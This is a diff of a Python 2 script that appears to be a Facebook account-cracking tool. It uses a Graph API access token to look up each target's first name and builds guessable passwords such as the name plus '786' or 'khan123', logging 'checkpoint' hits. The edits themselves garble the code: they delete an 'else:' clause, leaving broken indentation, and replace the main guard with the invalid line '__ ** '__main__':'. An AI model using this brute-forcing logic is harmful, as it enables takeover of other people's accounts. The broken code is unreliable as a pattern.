@@ -3,6 +3,9 @@
 
 
 
+
+
+
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
@@ -50,7 +53,7 @@ def jalan(z):
 ##### LOGO #####
 logo = """ 
 🅹🅰🅼
-🆇🅴
+xe
 🅼🅸🆂🅷🅸
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mJam Shahrukh
@@ -397,7 +400,7 @@ def pilih_super():
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																	
-               	else:
+               	    
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
 															pass8 = b['first_name'] + '786'
@@ -415,6 +418,7 @@ def pilih_super():
 																	cekpoint.append(user+pass8)														
 
                else:
+                   
 	a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
 			pass9 = ('khan123')
@@ -623,5 +627,5 @@ def pilih_super():
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 
-if __name__ == '__main__':
+__ ** '__main__':
 	login()
